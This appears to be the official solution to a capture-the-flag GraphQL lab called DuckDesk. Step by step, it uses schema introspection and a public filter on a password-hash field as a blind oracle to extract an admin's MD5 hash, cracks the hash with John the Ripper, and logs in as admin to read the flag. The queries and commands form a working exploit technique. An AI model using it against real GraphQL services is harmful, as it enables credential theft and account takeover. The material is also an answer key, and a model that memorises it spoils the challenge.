# DuckDesk — Official Solution

## Step-by-Step Attack Path

### 1. Reconnaissance

Open http://localhost:4000/ to access the GraphQL Playground. Run introspection to discover the full schema:

```graphql
query Introspect {
  __schema {
    types { name fields { name args { name type { name kind ofType { name kind } } } } }
  }
}
```

### 2. Discover the Target

Query the public team page to find who holds the ADMIN role:

```graphql
query TeamPage {
  teamPage { displayName department roleLabel }
}
```

Result reveals: **Drake Mallard** — "Head of Support" (ADMIN role).

### 3. Find the Oracle

Introspection shows `teamStats(filter: AgentFilter): TeamStats!` is public and unauthenticated. The `AgentFilter` input includes:

```graphql
input AgentFilter {
  displayName: StringFilter
  email: StringFilter
  department: StringFilter
  role: RoleFilter
  isActive: Boolean
  hiredAfter: DateTime
  hiredBefore: DateTime
  passwordHash: StringFilter   # ← Hidden leak point
}
```

Since `teamStats` returns only a count (`headcount`), and the filter supports `startsWith`, this is a blind boolean oracle.

### 4. Extract the Hash Character-by-Character

The admin's password hash is MD5 (32 lowercase hex characters). For each position, try all 16 hex digits:

```graphql
query Oracle($filter: AgentFilter) {
  teamStats(filter: $filter) { headcount }
}
# Variables:
{ "filter": { "displayName": { "eq": "Drake Mallard" }, "passwordHash": { "startsWith": "0d343c0f0ca763f983c8042350059f56" } } }
```

Optimized with aliases (batch 16 guesses in one request):

```graphql
query BatchGuess($a0: AgentFilter, $a1: AgentFilter, ..., $af: AgentFilter) {
  t0: teamStats(filter: $a0) { headcount }
  t1: teamStats(filter: $a1) { headcount }
  ...
}
```

For each character position (32 total), try `startsWith` with `<prefix><digit>` for digit in `0..f`. The one returning `headcount: 1` is the correct hex digit.

**Maximum requests:** 32 × 16 = 512 (worst case). With batching: ~32 requests.

### 5. Crack the Hash Offline

Save the extracted hash to a file and run John the Ripper:

```bash
echo "0d343c0f0ca763f983c8042350059f56" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Result: donald
```

### 6. Login as Admin

```graphql
mutation Login {
  login(input: { email: "drake.mallard@duckurity.example", password: "donald" }) {
    token
    viewer { displayName email role }
  }
}
```

Copy the returned JWT token.

### 7. Retrieve the Flag

Query the admin-only vault with the JWT:

```graphql
query Vault {
  vault { key value }
}
```

Headers: `Authorization: Bearer <token>`

Find the entry with key `incident_response_code` — its value is the flag: **DUCK{...}**

## Evidence

- Introspection confirms `AgentFilter.passwordHash` exists on public query.
- Oracle queries return deterministic counts matching DB state.
- Cracked password "donald" matches rockyou.txt entry.
- Vault contains exactly one DUCK{...} flag value.
